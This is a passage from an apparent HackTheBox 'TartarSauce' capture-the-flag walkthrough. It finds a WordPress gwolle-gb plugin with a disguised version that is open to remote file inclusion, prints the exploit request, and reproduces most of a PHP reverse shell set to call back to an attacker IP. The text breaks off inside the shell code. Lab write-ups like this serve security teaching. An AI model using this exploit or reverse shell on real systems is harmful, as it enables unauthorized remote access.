+&ldquo;Akismet checks your comments and contact form submissions against our global database of spam to protect you and your site from malicious content.&rdquo;</p>
+<p>Cool! The rest of the readme covers the installation and changelog. Let&rsquo;s check searchsploit for akistmet</p>
+<p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/akismet-ss.png"
+	width="594"
+	height="169"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/akismet-ss_huea3406bf9600c59f426d79e66abf9a79_24255_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/akismet-ss_huea3406bf9600c59f426d79e66abf9a79_24255_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="akismet searchsploit"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="843px"
+	
+><br>
+None of these are our version. Let&rsquo;s move on for now.</p>
+<h5 id="brute-force-login-protection-plugin">brute-force-login-protection plugin</h5>
+<p>http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
+&ldquo;Protects your website against brute force login attacks using .htaccess&rdquo;</p>
+<p>Good to have! Again, nothing else too interesting here. And nothing in searchsploit.</p>
+<h5 id="gwolle-gb">gwolle-gb</h5>
+<p>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
+&ldquo;Gwolle Guestbook is the WordPress guestbook you&rsquo;ve just been looking for. Beautiful and easy.&rdquo;</p>
+<p>In the changelog we find</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">== Changelog ==
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">= 2.3.10 =
+</span></span><span class="line"><span class="cl">* 2018-2-12
+</span></span><span class="line"><span class="cl">* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Very sneaky! Let&rsquo;s see if 1.5.3 is vulnerable.
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gwolle-ss.png"
+	width="1244"
+	height="150"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gwolle-ss_hu635bfaaad6ed253dd8bc58f4c1776e2b_22612_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gwolle-ss_hu635bfaaad6ed253dd8bc58f4c1776e2b_22612_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="gwolle searchsploit"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="829"
+		data-flex-basis="1990px"
+	
+><br>
+Bingo! Now we see why they were hiding the version, we have an RFI vulnerability. Let&rsquo;s take a look at it.
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/rfi.png"
+	width="1243"
+	height="257"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/rfi_hu5f85dede01cca9d6050bfcb6d9a712d1_127736_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/rfi_hu5f85dede01cca9d6050bfcb6d9a712d1_127736_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="rfi desc"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="483"
+		data-flex-basis="1160px"
+	
+><br>
+This looks like it should be able to provide our path in. Let&rsquo;s try it out.</p>
+<h2 id="gaining-access">Gaining Access</h2>
+<p>The advisory states that we can host a malicious php file named wp-load.php from an arbitrary remote server and execute its contents on the victim server. To execute, we request:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s grab a php reverse shell script from <a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"  target="_blank" rel="noopener"
+    >https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> and edit it to use our machine IP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility
+</span></span></span><span class="line"><span class="cl"><span class="c1">// for any actions performed using this tool.  The author accepts no liability
+</span></span></span><span class="line"><span class="cl"><span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then
+</span></span></span><span class="line"><span class="cl"><span class="c1">// do not use this tool.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// In all other respects the GPL version 2 applies:
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// This program is free software; you can redistribute it and/or modify
+</span></span></span><span class="line"><span class="cl"><span class="c1">// it under the terms of the GNU General Public License version 2 as
+</span></span></span><span class="line"><span class="cl"><span class="c1">// published by the Free Software Foundation.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// This program is distributed in the hope that it will be useful,
+</span></span></span><span class="line"><span class="cl"><span class="c1">// but WITHOUT ANY WARRANTY; without even the implied warranty of
+</span></span></span><span class="line"><span class="cl"><span class="c1">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+</span></span></span><span class="line"><span class="cl"><span class="c1">// GNU General Public License for more details.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// You should have received a copy of the GNU General Public License along
+</span></span></span><span class="line"><span class="cl"><span class="c1">// with this program; if not, write to the Free Software Foundation, Inc.,
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility
+</span></span></span><span class="line"><span class="cl"><span class="c1">// for any actions performed using this tool.  If these terms are not acceptable to
+</span></span></span><span class="line"><span class="cl"><span class="c1">// you, then do not use this tool.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// You are encouraged to send comments, improvements or suggestions to
+</span></span></span><span class="line"><span class="cl"><span class="c1">// me at pentestmonkey@pentestmonkey.net
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Description
+</span></span></span><span class="line"><span class="cl"><span class="c1">// -----------
+</span></span></span><span class="line"><span class="cl"><span class="c1">// This script will make an outbound TCP connection to a hardcoded IP and port.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// The recipient will be given a shell running as the current user (apache normally).
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Limitations
+</span></span></span><span class="line"><span class="cl"><span class="c1">// -----------
+</span></span></span><span class="line"><span class="cl"><span class="c1">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Usage
+</span></span></span><span class="line"><span class="cl"><span class="c1">// -----
+</span></span></span><span class="line"><span class="cl"><span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.6&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">1337</span><span class="p">;</span>       <span class="c1">// CHANGE THIS
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Daemonise ourself if possible to avoid zombies later
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise
+</span></span></span><span class="line"><span class="cl"><span class="c1">// our php process and avoid zombies.  Worth a try...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_fork&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Fork and have the parent process exit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Can&#39;t fork&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Make the current process a session leader
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Will only succeed if we forked
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Can&#39;t setsid()&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Change to a safe directory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Remove any umask we inherited
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Do the reverse shell...
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Open reverse connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Spawn shell process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Can&#39;t spawn shell&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Set everything to non-blocking
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check for end of TCP connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check for end of STDOUT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Wait until a command is end down $sock, or some
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// command output is available on STDOUT or STDERR
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// If we can read from the TCP socket, send
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// data to process&#39;s STDIN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// If we can read from the process&#39;s STDOUT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// send data down tcp connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// If we can read from the process&#39;s STDERR
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// send data down tcp connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
